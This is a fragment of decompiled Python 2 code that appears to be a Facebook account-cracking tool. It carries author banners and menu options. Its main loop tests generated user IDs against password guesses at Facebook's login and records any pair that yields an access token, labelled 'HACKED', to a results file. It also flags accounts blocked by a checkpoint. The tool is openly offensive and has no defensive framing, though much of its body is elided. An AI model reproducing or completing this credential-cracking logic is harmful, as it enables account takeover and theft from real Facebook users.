...
# Embedded file name: /storage/emulated/0/BD11.py
...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : Technical BD'
    print 'FACEBOOK : facebook.com/ifad.gaming.7'
    print 'GITHUB   : github.com/hackeboss'
    print 'FB PAGE  : https://m.facebook.com/The-Black-Squard-100653095854354/ '
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[KILLER_BOY-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[KILLER_BOY-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 03 Days]\x1b[0m \n'
